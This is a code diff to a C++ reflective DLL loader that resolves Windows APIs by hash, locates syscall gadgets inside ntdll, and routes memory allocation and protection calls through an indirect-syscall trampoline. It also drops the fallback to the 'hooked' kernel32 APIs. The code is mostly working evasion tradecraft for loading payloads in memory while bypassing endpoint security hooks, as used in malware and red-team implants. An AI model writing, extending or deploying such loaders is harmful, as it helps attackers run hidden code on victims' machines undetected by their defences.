@@ -8,6 +8,8 @@
 #pragma intrinsic(_ReturnAddress)
 #pragma intrinsic(_rotr)
 
+extern "C" LONG SyscallTrampoline(void* entry, ...);
+
 namespace {
     
     constexpr DWORD HASH_KEY = 13;
@@ -29,21 +31,14 @@ namespace {
     constexpr DWORD H_NTDLL         = 0x3CFA685D;
     constexpr DWORD H_LOADLIBRARYA  = 0xEC0E4E8E;
     constexpr DWORD H_GETPROCADDRESS= 0x7C0DFCAA;
-    constexpr DWORD H_VIRTUALALLOC  = 0x91AFCA54;
-    constexpr DWORD H_VIRTUALPROTECT= hash("VirtualProtect"); // 0x7946C61B
     constexpr DWORD H_FLUSHCACHE    = 0x534C0AB8;
 
     using LoadLibraryA_t = HMODULE(WINAPI*)(LPCSTR);
     using GetProcAddress_t = FARPROC(WINAPI*)(HMODULE, LPCSTR);
-    using VirtualAlloc_t = LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD);
-    using VirtualProtect_t = BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD);
     using NTSTATUS = LONG;
     using NtFlushInstructionCache_t = NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG);
     using DllMain_t = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
     
-    using NtAllocateVirtualMemory_t = NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
-    using NtProtectVirtualMemory_t = NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
-
     struct UNICODE_STR {
         USHORT Length;
         USHORT MaximumLength;
@@ -93,13 +88,14 @@ namespace {
         return h;
     }
     
-    struct MinimalSyscall {
-        PVOID pGadget;
-        WORD ssn;
+    struct SyscallEntry {
+        PVOID pSyscallGadget;  // Offset 0 (8 bytes) - ASM reads at [rbx+0] / [x19+0]
+        UINT  nArgs;           // Offset 8 (4 bytes) - ASM reads at [rbx+8] / [x19+8]
+        WORD  ssn;             // Offset 12 (2 bytes) - ASM reads at [rbx+12] / [x19+12]
     };
     
-    __forceinline MinimalSyscall ResolveSyscall(ULONG_PTR ntdllBase, DWORD nameHash) {
-        MinimalSyscall result = { nullptr, 0 };
+    __forceinline SyscallEntry ResolveSyscall(ULONG_PTR ntdllBase, DWORD nameHash, UINT nArgs) {
+        SyscallEntry result = { nullptr, 0, 0 };
         
         auto ntHdr = reinterpret_cast<PIMAGE_NT_HEADERS>(
             ntdllBase + reinterpret_cast<PIMAGE_DOS_HEADER>(ntdllBase)->e_lfanew
@@ -144,7 +140,8 @@ namespace {
                 // Look for: syscall; ret (0F 05 C3)
                 for (int offset = 0; offset < 64; offset++) {
                     if (bytes[offset] == 0x0F && bytes[offset + 1] == 0x05 && bytes[offset + 2] == 0xC3) {
-                        result.pGadget = bytes + offset;
+                        result.pSyscallGadget = bytes + offset;
+                        result.nArgs = nArgs;
                         result.ssn = ssn;
                         return result;
                     }
@@ -157,7 +154,8 @@ namespace {
                     uint32_t instr = *reinterpret_cast<uint32_t*>(bytes + offset);
                     uint32_t nextInstr = *reinterpret_cast<uint32_t*>(bytes + offset + 4);
                     if ((instr & 0xFF000000) == 0xD4000000 && nextInstr == 0xD65F03C0) {
-                        result.pGadget = bytes + offset;
+                        result.pSyscallGadget = bytes + offset;
+                        result.nArgs = nArgs;
                         result.ssn = ssn;
                         return result;
                     }
@@ -170,45 +168,9 @@ namespace {
         return result;
     }
     
-    // Inline syscall execution (x64 only - ARM64 will use function pointer approach)
-    __forceinline NTSTATUS ExecuteSyscall_Alloc(MinimalSyscall& sc, HANDLE hProcess,
-                                                 PVOID* baseAddr, ULONG_PTR zeroBits,
-                                                 PSIZE_T regionSize, ULONG allocType, ULONG protect) {
-#if defined(_M_X64)
-        // For reflective loader, use function pointer approach instead of inline asm
-        // to avoid compilation issues and maintain compatibility
-        using SyscallProc_t = NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG, WORD);
-        auto pSyscall = reinterpret_cast<SyscallProc_t>(sc.pGadget);
-        return reinterpret_cast<NtAllocateVirtualMemory_t>(sc.pGadget)(hProcess, baseAddr, zeroBits, regionSize, allocType, protect);
-#elif defined(_M_ARM64)
-        // ARM64: Cast gadget to function pointer and call directly
-        // MSVC ARM64 doesn't support inline asm, so we use indirect call
-        auto pSyscall = reinterpret_cast<NtAllocateVirtualMemory_t>(sc.pGadget);
-        // Note: SSN is already set in syscall stub at gadget location
-        return pSyscall(hProcess, baseAddr, zeroBits, regionSize, allocType, protect);
-#else
-        return -1;  // Unsupported architecture
-#endif
-    }
-    
-    __forceinline NTSTATUS ExecuteSyscall_Protect(MinimalSyscall& sc, HANDLE hProcess,
-                                                    PVOID* baseAddr, PSIZE_T regionSize,
-                                                    ULONG newProtect, PULONG oldProtect) {
-#if defined(_M_X64)
-        // Function pointer approach - gadget contains syscall instruction
-        return reinterpret_cast<NtProtectVirtualMemory_t>(sc.pGadget)(hProcess, baseAddr, regionSize, newProtect, oldProtect);
-#elif defined(_M_ARM64)
-        // ARM64: Cast gadget to function pointer and call directly
-        auto pSyscall = reinterpret_cast<NtProtectVirtualMemory_t>(sc.pGadget);
-        return pSyscall(hProcess, baseAddr, regionSize, newProtect, oldProtect);
-#else
-        return -1;
-#endif
-    }
-    
-    // Pre-computed hashes for syscalls we need
-    constexpr DWORD H_ZwAllocateVirtualMemory = 0x54B3D07F;  // hash("ZwAllocateVirtualMemory")
-    constexpr DWORD H_ZwProtectVirtualMemory = 0x50E92888;   // hash("ZwProtectVirtualMemory")
+    // Syscall hashes - computed via constexpr to guarantee match with CalcHash
+    constexpr DWORD H_ZwAllocateVirtualMemory = hash("ZwAllocateVirtualMemory");
+    constexpr DWORD H_ZwProtectVirtualMemory = hash("ZwProtectVirtualMemory");
 
     __forceinline DWORD CalcHashModule(UNICODE_STR* name) {
         DWORD h = 0;
@@ -233,8 +195,6 @@ namespace {
 extern "C" DLLEXPORT ULONG_PTR WINAPI Bootstrap(LPVOID lpParameter) {
     LoadLibraryA_t pLoadLibraryA = nullptr;
     GetProcAddress_t pGetProcAddress = nullptr;
-    VirtualAlloc_t pVirtualAlloc = nullptr;
-    VirtualProtect_t pVirtualProtect = nullptr;
     NtFlushInstructionCache_t pNtFlushInstructionCache = nullptr;
 
     ULONG_PTR base = GetIp();
@@ -279,16 +239,13 @@ extern "C" DLLEXPORT ULONG_PTR WINAPI Bootstrap(LPVOID lpParameter) {
 
     if (!k32Base || !ntdllBase) return 0;
 
-    MinimalSyscall scAlloc = ResolveSyscall(ntdllBase, H_ZwAllocateVirtualMemory);
-    MinimalSyscall scProtect = ResolveSyscall(ntdllBase, H_ZwProtectVirtualMemory);
-    
-    if (!scAlloc.pGadget || !scProtect.pGadget) {
-        // Fallback to hooked APIs if syscalls fail (better than crashing)
-        // Continue to resolve VirtualAlloc/VirtualProtect as backup
-    }
+    SyscallEntry scAlloc = ResolveSyscall(ntdllBase, H_ZwAllocateVirtualMemory, 6);
+    SyscallEntry scProtect = ResolveSyscall(ntdllBase, H_ZwProtectVirtualMemory, 5);
 
-    // 4. Resolve Kernel32 Imports (now only LoadLibrary and GetProcAddress are critical)
-    auto ResolveImports = [](ULONG_PTR moduleBase, auto& loadLib, auto& getProc, auto& virtAlloc, auto& virtProtect) {
+    if (!scAlloc.pSyscallGadget || !scProtect.pSyscallGadget) return 0;
+
+    // 4. Resolve Kernel32 Imports
+    auto ResolveImports = [](ULONG_PTR moduleBase, auto& loadLib, auto& getProc) {
         auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(moduleBase + reinterpret_cast<PIMAGE_DOS_HEADER>(moduleBase)->e_lfanew);
         auto exp = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(moduleBase + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
         auto names = reinterpret_cast<DWORD*>(moduleBase + exp->AddressOfNames);
@@ -298,17 +255,15 @@ extern "C" DLLEXPORT ULONG_PTR WINAPI Bootstrap(LPVOID lpParameter) {
         for (DWORD i = 0; i < exp->NumberOfNames; i++) {
             char* name = reinterpret_cast<char*>(moduleBase + names[i]);
             DWORD h = CalcHash(name);
-            
+
             if (h == H_LOADLIBRARYA) loadLib = reinterpret_cast<LoadLibraryA_t>(moduleBase + funcs[ords[i]]);
             else if (h == H_GETPROCADDRESS) getProc = reinterpret_cast<GetProcAddress_t>(moduleBase + funcs[ords[i]]);
-            else if (h == H_VIRTUALALLOC) virtAlloc = reinterpret_cast<VirtualAlloc_t>(moduleBase + funcs[ords[i]]);
-            else if (h == H_VIRTUALPROTECT) virtProtect = reinterpret_cast<VirtualProtect_t>(moduleBase + funcs[ords[i]]);
         }
     };
 
-    ResolveImports(k32Base, pLoadLibraryA, pGetProcAddress, pVirtualAlloc, pVirtualProtect);
+    ResolveImports(k32Base, pLoadLibraryA, pGetProcAddress);
 
-    if (!pLoadLibraryA || !pGetProcAddress || !pVirtualAlloc || !pVirtualProtect) return 0;
+    if (!pLoadLibraryA || !pGetProcAddress) return 0;
 
     // 5. Resolve Ntdll Imports (FlushInstructionCache)
     auto ntNtdll = reinterpret_cast<PIMAGE_NT_HEADERS>(ntdllBase + reinterpret_cast<PIMAGE_DOS_HEADER>(ntdllBase)->e_lfanew);
@@ -332,21 +287,11 @@ extern "C" DLLEXPORT ULONG_PTR WINAPI Bootstrap(LPVOID lpParameter) {
     
     PVOID newBase = nullptr;
     SIZE_T allocSize = oldNt->OptionalHeader.SizeOfImage;
-    NTSTATUS status = -1;
-    
-    if (scAlloc.pGadget) {
-        status = ExecuteSyscall_Alloc(scAlloc, reinterpret_cast<HANDLE>(-1),
-                                      &newBase, 0, &allocSize,
-                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    }
-    
-    if (status != 0 || !newBase) {
-        if (pVirtualAlloc) {
-            newBase = pVirtualAlloc(NULL, allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        }
-    }
-    
-    if (!newBase) return 0;
+
+    NTSTATUS status = SyscallTrampoline(&scAlloc, (HANDLE)-1, &newBase, (ULONG_PTR)0,
+                                        &allocSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), (ULONG)PAGE_READWRITE);
+
+    if (status != 0 || !newBase) return 0;
     
     ULONG_PTR newBaseAddr = reinterpret_cast<ULONG_PTR>(newBase);
 
@@ -368,7 +313,6 @@ extern "C" DLLEXPORT ULONG_PTR WINAPI Bootstrap(LPVOID lpParameter) {
     }
     
     DWORD entryPointRva = oldNt->OptionalHeader.AddressOfEntryPoint;
-    DWORD imageSize = oldNt->OptionalHeader.SizeOfImage;
 
     // 9. Process Relocations
     ULONG_PTR delta = newBaseAddr - oldNt->OptionalHeader.ImageBase;
@@ -467,14 +411,8 @@ extern "C" DLLEXPORT ULONG_PTR WINAPI Bootstrap(LPVOID lpParameter) {
         PVOID sectionBase = reinterpret_cast<PVOID>(newBaseAddr + sec[i].VirtualAddress);
         SIZE_T sectionSize = sec[i].Misc.VirtualSize;
         
-        if (scProtect.pGadget) {
-            // Use direct syscall
-            ExecuteSyscall_Protect(scProtect, reinterpret_cast<HANDLE>(-1),
-                                  &sectionBase, &sectionSize, newProtect, &oldProtect);
-        } else if (pVirtualProtect) {
-            // Fallback to hooked API
-            pVirtualProtect(sectionBase, sectionSize, newProtect, &oldProtect);
-        }
+        SyscallTrampoline(&scProtect, (HANDLE)-1, &sectionBase, &sectionSize,
+                          (ULONG)newProtect, &oldProtect);
     }
 
     // 12. Call DllMain
